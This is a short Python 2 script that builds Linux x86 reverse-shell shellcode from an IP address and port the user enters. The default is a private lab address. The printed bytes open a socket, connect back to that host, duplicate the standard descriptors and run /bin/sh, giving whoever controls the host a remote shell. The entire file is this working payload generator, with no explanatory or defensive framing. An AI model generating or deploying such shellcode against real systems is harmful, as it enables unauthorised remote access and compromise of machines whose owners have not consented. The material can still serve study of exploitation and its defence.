#!/usr/bin/python

import struct
import socket

def format_shellcode(ip, port):
  return "\\x31\\xc0\\x50\\x40\\x50\\x40\\x50\\xb0\\x66\\x8b\\x5c\\x24\\x04\\x89" +\
          "\\xe1\\xcd\\x80\\x89\\xc7\\x68" +\
          ip +\
          "\\x31\\xdb\\x66\\xb9" + \
          port + \
          "\\xc1\\xe1\\x10\\xb1\\x02\\x51\\x89\\x64\\x24\\xf8\\x6a\\x10\\x83\\xec" + \
          "\\x04\\x50\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xf8" + \
          "\\xb0\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x02\\x7e\\xf6\\x31\\xc0\\xff\\x74" + \
          "\\x24\\xf8\\x50\\x89\\xe2\\x89\\xe1\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f" + \
          "\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

def get_ip(addr):
  return socket.inet_aton(addr)


def packPort(port):
  return struct.pack("!H", port)

def format_val(string):
  return "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in string)

ip = raw_input("IP:")

if ip == "":
  ip = "172.16.143.141"

ipEnc = format_val(get_ip(ip))

port = int(raw_input("Port:"))

portEnc = format_val(packPort(port))

print format_shellcode(ipEnc, portEnc)
